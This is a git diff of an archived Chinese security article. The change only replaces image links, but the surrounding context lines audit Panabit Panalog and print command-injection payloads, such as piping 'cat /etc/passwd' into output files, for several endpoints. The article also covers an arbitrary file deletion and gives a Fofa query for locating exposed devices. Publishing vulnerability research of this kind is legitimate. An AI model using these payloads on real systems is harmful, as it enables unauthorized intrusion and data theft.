@@ -66,7 +66,7 @@ schema_version: "1"
 
 **Fofa:app="Panabit-Panalog"   **影响版本: <=** **MARS r10p1Free****
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5TClHMIKmicX9Y6h33gkBNibziaQvIwhGmfothBCEA3fr1VEt39dj1dLgQ/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/8ea5d8aaea38f1d55d2e23cccfb62796f0dc78a79b09aa5651c62d242fe26ce1.png)
 
 **访问** **/cretime.txt 文件可查看版本.**
 
@@ -76,11 +76,11 @@ schema_version: "1"
 
 ****https://www.panabit.com/cn/product/2021/0107/379.html****
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5fIdVpasibuWdhHpK731nibO8JKiacLLlqEB7ibal1QicibwN4yVI2W39dySA/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/a1a23980b35f607270a22f6725654704016ba71c99352660481399ee2eca8063.png)
 
 **下载下来 发现 web 目录在 \usr\logd\www**
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5ksEEOqWyv0q3aDlyicPwOuZibsECpHo0Rl5HNLKDfwh0giadibVOMMSzMg/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/62590b00ecbf3ae1ba6bc2a2ef7dd1d35d1b2e973a7b2a5baead6d6989d4e31e.png)
 
 **直接开始审计 我这里用 Seay 源代码审计系统.**
 
@@ -100,13 +100,13 @@ rm -rf $(grep -ril 'chksession()' ./)
 
 **这里定位到一处命令执行.**
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5uI8MsFZ7EjSf3eLN6IXhyCEhoM678P8e0IJITck1kGRIWbxcSFDlgQ/640?wx_fmt=png&from=appmsg)  
+![](../../.resource/remote/e420b6e5de4e57b90e1ced9ff06c1d40f3a1a73b059d45ef254c6975effcb7e0.png)  
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5j5dZlSiaibxhO1fZibibA8NA6kNtCibPsFjs9mkGic6JicNE9HFEic6e0avJdg/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/22cc742779309a237dc7b9dcc34584bfd20890cbdb55adaae0b84d6e7eee4baf.png)
 
 **发现其通过** **Username** **参数传递进去 利用 Exec 执行命令 未做过滤 但是命令没有回显.**
 
-**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5RRPuI5ibhc82ZPpApsMLtHffvL3xibHfzvwasooRNUzAkuGdFvSNeoLA/640?wx_fmt=png&from=appmsg)**
+**![](../../.resource/remote/f5d8892e25eb4ec295e03f2cb766211cb6516eff1c3b0fc7121c267b1f64e6ab.png)**
 
 **Payload:  
 **
@@ -121,9 +121,9 @@ username=|cat /etc/passwd >1.txt
 
 **定位到第二处前台命令执行.**
 
-**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5QLg26AZ31O17zqpykvVibdyXoFBdmlORLhxMicmWQicpjNKLoa8FU19CQ/640?wx_fmt=png&from=appmsg)**
+**![](../../.resource/remote/e5a389562d698a8527fb36712af073a136e08e11eeb8dad930c9dcff163cffab.png)**
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5kndpib6rNicaf4iaSuApQ6YIicicy6XMgcAVKbXZjr1CrCFAeiaOibDsN0tGg/640?wx_fmt=png&from=appmsg)  
+![](../../.resource/remote/a18c1b36025eee7d3465f8977b55852a8af3b701f178dc0ef31f2aeb8e502440.png)  
 
 **这里传递了三个参数（Get 传入或 Post 传入都是可以的）：Token id host**
 
@@ -145,19 +145,19 @@ token=1&id=2&host=|cat /etc/passwd >222.txt
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5fgiccvbNhYgfw1Y6GqIl4yQ8LNwkrHVGvgOhF6gD1OIjvf9R2pQ6goQ/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/aced52b3d8599b45fceac2b0c651af303ad231ffbda83a651c7426d21cb584e6.png)
 
 命令执行点 3
 
 **又定位到一处命令执行.**
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5kvCtyKgCDHGk4LvDawIhEbq34HbCe5ROXhBtYkdJACABuQ05DWsGLw/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/9d0ae81f6f4b34673cca8f25ce00d5356b21759e85c0e13dcdc4d778057b0c69.png)
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5Lot9Dic7wwgFyX2aYODWvALgNkyBmWfKQ6tZplRKT4CpbMEn9aOMiagQ/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/0fb8f2c31a3b61ee44beaec0fd49238f695f51e035676f0029910a584de7d8b0.png)
 
 **这里 grpid 参数通过 postval 函数 (上边 Include 包含了 / common.php 文件 中有定义) 传入 然后带入命令执行.**
 
-**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd55gyQ4ROLR65sRrVhVDPR4woUibPCRZHaYT8uFkGG8znR2iatZm662Xxg/640?wx_fmt=png&from=appmsg)**
+**![](../../.resource/remote/5e3f04d17c9a747e31acd0ce48db9a47a92c2e2986d0657a66bacb007ae51bd6.png)**
 
 **直接构造请求：**  
 
@@ -167,7 +167,7 @@ action=serverdelay&grpid=|id >333.txt
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5ZTKm7TiaicudIJvSX7V9g0I5gqXJgfnLPWNDWD2R8ia8KN0KWwiaXxp4yQ/640?wx_fmt=png&from=appmsg)
+![](../../.resource/remote/bed9a1ecf3e0eea9d87ca2426b9599dbd0772a51c604af1ce50e7a710874d834.png)
 
 0x02 后台任意命令执行
 
@@ -177,7 +177,7 @@ action=serverdelay&grpid=|id >333.txt
 **/ajax_ping.php** **这里 post 传递了 ipaddr 函数 带入 exec 命令执行.**
 ----------------------------------------------------------
 
-**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5HEox6GiblYDkV9aB8pCgSdhIb9ic2GFIaxYBxLCVAwdX7a0Oviav4RwcQ/640?wx_fmt=png&from=appmsg)**
+**![](../../.resource/remote/cb7cebdf597dae5dbfb44f104ffa0e3608360a8c45d696dca514c1c7b6791597.png)**
 
 **Payload:  
 **
@@ -188,13 +188,13 @@ ipaddr=|id >2.txt
 
 ```
 
-**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5BM8NicAp4ice6Mn4uzB0LjTPUzznxpEKaNzzV4BVVIW3icGREKTn4G4OQ/640?wx_fmt=png&from=appmsg)**
+**![](../../.resource/remote/4e45ecdfadce33f90a4e16f09189010bd64abc9b4f5fef2e31f5a89fa4bf3af6.png)**
 
 执行点 2
 
 **/fetchfile.php** **post 传递了 filename,nodeip,type 参数可控，带入 exec 造成命令执行**
 
-**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd56Ke7emVvnx44JQerAnYbiakCMl6QRQmibdjRJWQ5vbU49iaCeUltsx91g/640?wx_fmt=png&from=appmsg)**
+**![](../../.resource/remote/7011a4d49b4e5d08233c8c0e50188630bcc9db7f4c4a0fff71295152d5f537b9.png)**
 
 **Payload:**  
 
@@ -204,13 +204,13 @@ type=downloadfile&filename=|id >5.txt
 
 ```
 
-**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5hf9I87A3LvIfRQMZoRibaPJ8rEvthpn7moaaia4LG3DMFxfQTJVPBLGQ/640?wx_fmt=png&from=appmsg)**
+**![](../../.resource/remote/93b1d97ea672904458f04b6128d469d76488f1da9524c77c8fbfc08932bc7a3c.png)**
 
 执行点 3  
 
 **/account/accountlist.php** **可以传递 account,startdt,enddt.**
 
-**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5q4xZ66wa8hRmWeu3kWlneY3AianlpiaK4TeSx0ZAAO7ID0vBVNImy99g/640?wx_fmt=png&from=appmsg)**
+**![](../../.resource/remote/15ce6f0cfd18c2684ccfa28fa00dc3c61d2fb2f1eca894fcf39e243f345c119e.png)**
 
 **Payload:  
 **
@@ -221,13 +221,13 @@ type=acctoapp&account=123&errname=|ps >9.txt
 
 ```
 
-**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5fLf2VZibVLUZsRouAqnlDUpvkibvH6lC0jYbLLlQQsoWQcdA8bXvV9iaQ/640?wx_fmt=png&from=appmsg)**
+**![](../../.resource/remote/2af97fa11ba753120d704b35fc4ef074982938dc1ce5911d76eaad411c0883d7.png)**
 
 0x03 后台任意文件删除  
 
 **定位到一处删除文件操作. /deletefile.php**
 
-**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5NgPD6f5zODkOJkqMko8Giajxn8fZ9yamlGIsjvgoausUCCsiau853fbg/640?wx_fmt=png&from=appmsg)**
+**![](../../.resource/remote/a2f6e963318095505e68bdff53c9de623a48903f0a9b65340e473c29f1b14788.png)**
 
 **Payload:  
 **
@@ -238,7 +238,7 @@ filename=5.txt
 
 ```
 
-**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5iczIBV3gwFwLPiaeQyvp5QgIB2TZpwPSwoUG7dnGxWql5CvO5RicuK9GQ/640?wx_fmt=png&from=appmsg)**
+**![](../../.resource/remote/5fc264f10495ce30f97c1bb2bf71712fd9a53b4add25add567df8c4837eb3c2e.png)**
 
 **免责声明：****文章中涉及的程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！！**
 ======================================================================================================
